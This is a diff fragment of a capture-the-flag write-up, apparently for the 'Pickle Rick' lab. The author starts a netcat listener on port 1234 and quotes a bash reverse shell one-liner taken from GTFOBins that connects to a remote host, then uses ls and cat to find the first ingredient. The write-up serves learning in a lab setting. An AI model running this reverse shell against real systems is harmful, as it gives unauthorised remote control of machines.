@@ -35,6 +35,7 @@ Within the directories given, I was also directed to a login page. If you explor
 
 After seeing that a command line was given, I decided to host a netcat listener on my local kali machine on port 1234. I used this port because I knew nothing would be communicating on it. The exact command that I used will be provided via the chaeatsheet.11 Netcat is a command for reading and writing data between two computers. Next, I used a bash reverse shell command that I found on gtfobins, since I found this on a third party site, I will provide the command here. 
 - bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+
 After successfully running the reverse bash, I was given a shell through the Picklerick site, giving me access. 
 
 Once I had the reverse shell running on my local kali machine, I just used a simple ls command to see what folders existed. I seen that there was a text file that may contain an ingredient. I then used another simple cat command to see the contents of this file. This gave me the first ingredient needed to answer. 
